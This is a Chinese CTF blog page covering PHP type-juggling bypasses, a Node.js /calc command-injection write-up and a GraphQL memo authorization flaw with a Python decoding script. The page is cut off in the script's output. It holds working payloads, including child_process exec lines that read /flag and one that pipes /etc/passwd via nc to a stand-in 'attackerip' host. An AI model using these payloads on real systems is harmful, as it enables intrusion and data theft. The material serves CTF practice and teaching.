<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">num=<span class="number">2e4</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$num=<span class="string">'2e4'</span>;                                字符串</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"intval('2e4') = "</span>.intval($num));         intval(<span class="string">'2e4'</span>) = <span class="number">2</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"'2e4'+1 = "</span>;                             <span class="string">'2e4'</span>+<span class="number">1</span> = float(<span class="number">20001</span>)</span><br><span class="line">var_dump(($num+<span class="number">1</span>));</span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"intval('2e4'+1) = "</span>.intval($num+<span class="number">1</span>));       intval(<span class="string">'2e4'</span>+<span class="number">1</span>) = <span class="number">20001</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"you pass!"</span>);                            you pass! </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>int转string：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$var = <span class="number">5</span>;  </span><br><span class="line">方式<span class="number">1</span>：$item = (string)$var;  </span><br><span class="line">方式<span class="number">2</span>：$item = strval($var);</span><br></pre></td></tr></table></figure>

<p>string转int：intval()函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(intval(<span class="string">'2'</span>)) <span class="comment">//2  </span></span><br><span class="line">var_dump(intval(<span class="string">'3abcd'</span>)) <span class="comment">//3  </span></span><br><span class="line">var_dump(intval(<span class="string">'abcd'</span>)) <span class="comment">//0</span></span><br></pre></td></tr></table></figure>

<p>intval函数用于将输入的变量转换为整形，对于32位系统来说，int的范围为-2147483648~2147483647，当输入的数大于2147483647时，转换结果为2147483647，即</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval(<span class="number">2147483647</span>+x)=<span class="number">2147483647</span></span><br><span class="line">x&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure>



















































<p>当代码中存在<em>$_<strong><strong>REQUEST[‘</strong></strong>user_id’]<em>里面类似的参数的时候，我们在url上可以这样</em>a.php?user.id*传参去进行绕过,这样进去之后也能表示</em>$_REQUEST[‘user_id’]*的值，同样可以绕过的符号还有+，[ 等，应该说是php的一个小特性</p>
<p>安恒月赛 奇怪的恐龙特性</p>
<p>题目源码：</p>
<p>\1.    &lt;?php</p>
<p>\2.    highlight_file(<strong>FILE</strong>);</p>
<p>\3.    ini_set(“display_error”, false); </p>
<p>\4.    error_reporting(0); </p>
<p>\5.    $str = isset($_GET[‘A_A’])?$_GET[‘A_A’]:’A_A’;</p>
<p>\6.    if (strpos($_SERVER[‘QUERY_STRING’], “A_A”) !==false) {</p>
<p>\7.      echo ‘A_A,have fun’;</p>
<p>\8.    }</p>
<p>\9.    elseif ($str&lt;9999999999) {</p>
<p>\10.    echo ‘A_A,too small’;</p>
<p>\11.  }</p>
<p>\12.  elseif ((string)$str&gt;0) {</p>
<p>\13.    echo ‘A_A,too big’;</p>
<p>\14.  }</p>
<p>\15.  else{</p>
<p>\16.    echo file_get_contents(‘flag.php’);</p>
<p>\17.   </p>
<p>\18.  }</p>
<p>\19.  ?&gt;</p>
<p>阅读代码发现，首先第一步要绕过A_A这个符号，如果出现这个符号他就会显示A_A,have fun，就不能继续往下面执行到file_get_contents(‘flag.php’)了，但是我们发送get参数的时候又必须要发送，因此我们就用到刚才的知识点，我们可以用A.A或者是A+A去传参去绕过。<br> 下面的代码就是常规的数字绕过了，但这里也用到了一个trick，就是无论你的数字多大，对于数组而言总是比数组小。</p>
<p>利用数组去绕过$str&lt;9999999999的特性，下面一个判断是强制转化为字符串在与数字比较的判断，这就是平常操作很多的弱类型了，直接让参数等于admin就可以了，因为“admin”== 0 ，结果是true，直接等于0绕过即可，所以这题的payload<br> <code>http://101.71.29.5:10007/?A+A[]=admin</code></p>
<h4 id="绕过disable-function的方法"><a href="#绕过disable-function的方法" class="headerlink" title="绕过disable_function的方法"></a>绕过disable_function的方法</h4>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-id="clmvmvoj000041s7k1x8c8qfm" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-unctf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/15/unctf/" class="article-date">
  <time datetime="2019-11-15T08:25:43.000Z" itemprop="datePublished">2019-11-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/ctf/">ctf</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/15/unctf/">unctf</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="血小板"><a href="#血小板" class="headerlink" title="血小板"></a>血小板</h4><p><code>/calc</code> 可以计算，  命令执行<br>nodejs注入<br><strong>NodeJS 远程代码执行</strong></p>
<p><code>require(&#39;child_process&#39;).exec(&#39;cat+/etc/passwd+|+nc+attackerip+80&#39;)</code></p>
<p><code>/calc require (‘child_process’).exec (‘ls’).toString ()</code></p>
<p> execSync：</p>
<p><code>/calc require (‘child_process’).execSync (‘ls’).toString ()</code></p>
<p><code>/calc require (‘child_process’).execSync (‘cat /flag’).toString ()</code></p>
<p>应该是空格的问题，那就用 $IFS 替代：</p>
<p><code>/calc require (‘child_process’).execSync (‘cat$IFS/flag’).toString ()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;calc require(&#39;fs&#39;).readdirSync(&#39;..&#x2F;&#39;)</span><br><span class="line">发现根目录下有flag,再用readdirSync(&#39;..&#x2F;flag&#39;)查看目录时报错，说明flag不是目录是文件。</span><br><span class="line">所以进行同步读取文件：</span><br><span class="line">&#x2F;calc require(&#39;fs&#39;).readFileSync(&#39;..&#x2F;flag&#39;)，返回了一个文件对象，重新用burp抓包可以看到对象的具体内容，ascii解码后就是flag</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/15/unctf/" data-id="clmvmvooe001b1s7keb2yfhkd" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/unctf/" rel="tag">unctf</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-GraphiQL" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/14/GraphiQL/" class="article-date">
  <time datetime="2019-11-14T06:17:07.000Z" itemprop="datePublished">2019-11-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/14/GraphiQL/">GraphiQL</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p> GraphQL查询语句的构造 </p>
<h4 id="简单的备忘录"><a href="#简单的备忘录" class="headerlink" title="简单的备忘录"></a>简单的备忘录</h4><p>  通过如下查询，可以获取所有用户的所有memos信息： </p>
<blockquote>
<p>query {<br>  allUsers {<br>     edges {<br>       node {<br>         <strong>username</strong><br>            <strong>memos</strong> {<br>                edges {<br>                    node {<br>                        <strong>id</strong><br>                        <strong>private</strong><br>                        <strong>content</strong><br>                        }<br>                    }<br>                }<br>            }<br>        }<br>    }<br>}</p>
</blockquote>
<p>username查询执行结果:</p>
<blockquote>
<p>{<br>  “data”: {<br>    “allUsers”: {<br>      “edges”: [<br>        {<br>          “node”: {<br>            “<strong>username</strong>“: “<strong>admin</strong>“,<br>            “<strong>memos</strong>“: {<br>              “edges”: [<br>                {<br>                  “node”: {<br>                    “<strong>id</strong>“: “<strong>TWVtb186Mg==</strong>“,<br>                    “<strong>private</strong>“: <strong>false</strong>,<br>                    “<strong>content</strong>“: “<strong>flag</strong>{<strong>3ad4aaedf408c147d5f747f7ce76d2b4</strong>}”<br>                  }<br>                }<br>              ]<br>            }<br>          }<br>        },<br>        {<br>          “node”: {<br>            <strong>“username”: “guest”,</strong><br>            “memos”: {<br>              “edges”: [<br>                {<br>                  “node”: {<br>                    <strong>“id”: “TWVtb186MQ==”,</strong><br>                    <strong>“private”: false,</strong><br>                    <strong>“content”: “this is a test memo.”</strong><br>                  }<br>                }<br>              ]<br>            }<br>          }<br>        }<br>      ]<br>    }<br>  }<br>}</p>
</blockquote>
<p>查看<strong>schema (即接口文档，这个GraphQL服务提供了什么样的接口)。 **，还提供了一个</strong>UpdateMemoInfo**的修改功能。 </p>
<p>漏洞利用 通过UpdateMemoInfo修改memo的<strong>private</strong>属性,修改结果如图3: <strong>修改memo id为2的记录</strong></p>
<p><img src="/2019/11/14/GraphiQL/image-20191114164415863.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutation&#123;</span><br><span class="line">  updateMemoInfo(mid:2,private:false)&#123;</span><br><span class="line">		ok</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 再使用第一次的查询，获得flag </p>
<blockquote>
<p>{<br>  “data”: {<br>    “allUsers”: {<br>      “edges”: [<br>        {<br>          “node”: {<br>            “username”: “admin”,<br>            “memos”: {<br>              “edges”: [<br>                {<br>                  “node”: {<br>                    “id”: “TWVtb186Mg==”,<br>                    “private”: false,<br>                    “content”: “flag{3ad4aaedf408c147d5f747f7ce76d2b4}”<br>                  }<br>                }<br>              ]<br>            }<br>          }<br>        },<br>        {<br>          “node”: {<br>            “username”: “guest”,<br>            “memos”: {<br>              “edges”: [<br>                {<br>                  “node”: {<br>                    “id”: “TWVtb186MQ==”,<br>                    “private”: false,<br>                    “content”: “this is a test memo.”<br>                  }<br>                }<br>              ]<br>            }<br>          }<br>        }<br>      ]<br>    }<br>  }<br>}</p>
</blockquote>
<h4 id="加密的备忘录"><a href="#加密的备忘录" class="headerlink" title="加密的备忘录"></a>加密的备忘录</h4><p> 可以看到没有提供GraphQL的图形化查询界面,使用浏览器插件Altair GraphQL Client即可以进行图形化的查询 </p>
<p><code>http://183.129.189.60:10042/graphql</code></p>
<blockquote>
<p>query{<br>  users{<br>    id<br>    username<br>  }<br>}</p>
</blockquote>
<p>返回</p>
<blockquote>
<p>{<br>  “data”: {<br>    “users”: [<br>      {<br>        “id”: “VXNlcjox”,<br>        “username”: “admin”<br>      },<br>      {<br>        “id”: “VXNlcjoy”,<br>        “username”: “guest”<br>      }<br>    ]<br>  }<br>}</p>
</blockquote>
<p> 测试GraphQL的所有功能，发现memos有一个private字段，并提供了修改功能可以修改这个字段值，构造修改查询，可以看到mid等于2可以修改成 功 </p>
<p> 修改private属性为false </p>
<blockquote>
<p>mutation{<br>  updateMemoInfo(title:”testaaa”,mid:2,private:false){<br>        ok<br>  }<br>}</p>
</blockquote>
<p>返回</p>
<blockquote>
<p>{<br>  “data”: {<br>    “updateMemoInfo”: {<br>      “ok”: true<br>    }<br>  }<br>}</p>
</blockquote>
<p> 再查询memos，能看到多了1条记录，但是还是看不到留言内容。通过使用allUsers查询可以获得详细的memo信息，结果如图5: </p>
<blockquote>
<p>query {<br>  allUsers {<br>     edges {<br>       node {<br>         username<br>            memos {<br>                edges {<br>                    node {<br>                        id<br>                        private<br>                        content<br>                        }<br>                    }<br>                }<br>            }<br>        }<br>    }<br>}</p>
</blockquote>
<p> 返回 </p>
<blockquote>
<p>{<br>  “data”: {<br>    “allUsers”: {<br>      “edges”: [<br>        {<br>          “node”: {<br>            “username”: “admin”,<br>            “memos”: {<br>              “edges”: [<br>                {<br>                  “node”: {<br>                    “id”: “TWVtb186Mg==”,<br>                    “private”: false,<br>                    “content”: “到年种成到定过成个他成会为而时方上而到年到年以可为多为而到可对方生而以年为有到成上可我行到他的面为们方爱”<br>                  }<br>                }<br>              ]<br>            }<br>          }<br>        },<br>        {<br>          “node”: {<br>            “username”: “guest”,<br>            “memos”: {<br>              “edges”: [<br>                {<br>                  “node”: {<br>                    “id”: “TWVtb186MQ==”,<br>                    “private”: false,<br>                    “content”: “this is a test memo.”<br>                  }<br>                }<br>              ]<br>            }<br>          }<br>        }<br>      ]<br>    }<br>  }<br>}</p>
</blockquote>
<p> GraphQL中有checkPass这个查询可以使用，提供一个memo的id和密码返回检测结果,随便猜测一个密码， </p>
<blockquote>
<p>query {<br>    checkPass(memoId:2,password:”text”)<br>}</p>
</blockquote>
<p> 返回 </p>
<blockquote>
<p>{<br>  “errors”: [<br>    {<br>      “path”: [<br>        “checkPass”<br>      ],<br>      “locations”: [<br>        {<br>          “line”: 4,<br>          “column”: 2<br>        }<br>      ],<br>      “message”: “‘出有来行出的爱爱’ not valid password.”<br>    }<br>  ],<br>  “data”: {<br>    “checkPass”: null<br>  }<br>}</p>
</blockquote>
<p> 错误消息中提示了输入的密码加密后的结果。根据base64原理，可以获取到base64的转换表，具体代码如下： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#coding = UTF - 8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests<span class="comment"># 代理设置</span></span><br><span class="line">proxy = <span class="string">'http://127.0.0.1:8080'</span></span><br><span class="line">use_proxy = <span class="literal">False</span></span><br><span class="line">MY_PROXY = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> use_proxy:</span><br><span class="line">    MY_PROXY = &#123;</span><br><span class="line">        <span class="string">'http'</span>: proxy,</span><br><span class="line">        <span class="string">'https'</span>: proxy,</span><br><span class="line">    &#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'en,ja;q=0.9,zh-HK;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">&#125;</span><br><span class="line">my_cookie = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_req</span><span class="params">(url, data = None, method = <span class="string">'GET'</span>, params = None, json =</span></span></span><br><span class="line"><span class="function"><span class="params">        False, cookies = None, proxies = MY_PROXY)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> json:</span><br><span class="line">        method = <span class="string">'POST'</span></span><br><span class="line">        json = data</span><br><span class="line">        data = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">'GET'</span>:</span><br><span class="line">        params = data</span><br><span class="line">        data = <span class="literal">None</span></span><br><span class="line">    r = requests.request(method, url, headers = headers, verify = <span class="literal">False</span>,</span><br><span class="line">        json = json, params = params, data = data, cookies = cookies, proxies = MY_PROXY)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">graph_req</span><span class="params">(url, body)</span>:</span></span><br><span class="line">    body = &#123;</span><br><span class="line">        <span class="string">'query'</span>: body</span><br><span class="line">    &#125;</span><br><span class="line">    r = http_req(url, data = body, json = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost:8800/graphql"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_decode</span><span class="params">(base_table)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    base64的6位索引转换为字符串</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    bases = <span class="string">''</span>.join(base_table)</span><br><span class="line">    bytes_len = int(len(bases) / <span class="number">8</span>)</span><br><span class="line">    byte_table = [bases[i * <span class="number">8</span>: (i + <span class="number">1</span>) * <span class="number">8</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(bytes_len)</span><br><span class="line">    ]</span><br><span class="line">    <span class="comment"># bases2 = ''.join(byte_table)</span></span><br><span class="line">    <span class="comment"># if bases != bases2: </span></span><br><span class="line">    <span class="comment">#print('error...')</span></span><br><span class="line">    char_table = [int(b, <span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> byte_table]</span><br><span class="line">    <span class="keyword">return</span> char_table</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_one</span><span class="params">(tbl, idx)</span>:</span></span><br><span class="line">    tbl = [<span class="string">'&#123;0:06b&#125;'</span>.format(i) <span class="keyword">for</span> i <span class="keyword">in</span> tbl]</span><br><span class="line">    rtbl = base64_decode(tbl)</span><br><span class="line">    s = <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> rtbl])</span><br><span class="line">    r = graph_req(url, <span class="string">'''</span></span><br><span class="line"><span class="string">            query &#123;</span></span><br><span class="line"><span class="string">            checkPass(memoId: 2,</span></span><br><span class="line"><span class="string">                password: "%s")</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        '''</span> % s)</span><br><span class="line">    message = r[<span class="string">'errors'</span>][<span class="number">0</span>][<span class="string">'message'</span>]</span><br><span class="line">    print(idx, message)</span><br><span class="line">    valid_code = message.split(<span class="string">"'"</span>)[<span class="number">1</span>][<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> valid_code<span class="comment"># 获取base64编码表</span></span><br><span class="line"></span><br><span class="line">base_tbl = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">    tbl = [<span class="number">0</span> b111111, <span class="number">0</span> b111111, <span class="number">0</span> b011011, c]</span><br><span class="line">    valid_code = decode_one(tbl, c)</span><br><span class="line">    base_tbl.append(valid_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding字符</span></span><br><span class="line">valid_code = decode_one([<span class="number">0</span> b111111, <span class="number">0</span> b111111, <span class="number">0</span> b011011], <span class="number">-1</span>)</span><br><span class="line">base_tbl.append(valid_code)</span><br><span class="line">base_tbl = <span class="string">''</span>.join(base_tbl)</span><br><span class="line"></span><br><span class="line">std_b64_table =</span><br><span class="line">    <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(s)</span>:</span></span><br><span class="line">    table = str.maketrans(base_tbl, std_b64_table)</span><br><span class="line">    new_s = s.translate(table)</span><br><span class="line">    new_s += <span class="string">"="</span></span><br><span class="line">    result = base64.b64decode(bytes(new_s, <span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> str(result, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'password:'</span>, decode(<span class="string">'要有了产于了主方以定人方于有成以他的爱爱'</span>))</span><br><span class="line">print(<span class="string">'flag:'</span>, decode(</span><br><span class="line">    <span class="string">'到年种成到定过成个他成会为而时方上而到年到年以可为多为而到可对方生而以年为有到成上可我行到他的面为们方爱'</span>))</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="string">'十十地的'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">1</span> <span class="string">'十十地一'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">2</span> <span class="string">'十十地是'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">3</span> <span class="string">'十十地在'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">4</span> <span class="string">'十十地不'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">5</span> <span class="string">'十十地了'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">6</span> <span class="string">'十十地有'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">7</span> <span class="string">'十十地和'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">8</span> <span class="string">'十十地人'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">9</span> <span class="string">'十十地这'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">10</span> <span class="string">'十十地中'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">11</span> <span class="string">'十十地大'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">12</span> <span class="string">'十十地为'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">13</span> <span class="string">'十十地上'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">14</span> <span class="string">'十十地个'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">15</span> <span class="string">'十十地国'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">16</span> <span class="string">'十十地我'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">17</span> <span class="string">'十十地以'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">18</span> <span class="string">'十十地要'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">19</span> <span class="string">'十十地他'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">20</span> <span class="string">'十十地时'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">21</span> <span class="string">'十十地来'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">22</span> <span class="string">'十十地用'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">23</span> <span class="string">'十十地们'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">24</span> <span class="string">'十十地生'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">25</span> <span class="string">'十十地到'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">26</span> <span class="string">'十十地作'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">27</span> <span class="string">'十十地地'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">28</span> <span class="string">'十十地于'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">29</span> <span class="string">'十十地出'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">30</span> <span class="string">'十十地就'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">31</span> <span class="string">'十十地分'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">32</span> <span class="string">'十十地对'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">33</span> <span class="string">'十十地成'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">34</span> <span class="string">'十十地会'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">35</span> <span class="string">'十十地可'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">36</span> <span class="string">'十十地主'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">37</span> <span class="string">'十十地发'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">38</span> <span class="string">'十十地年'</span> <span 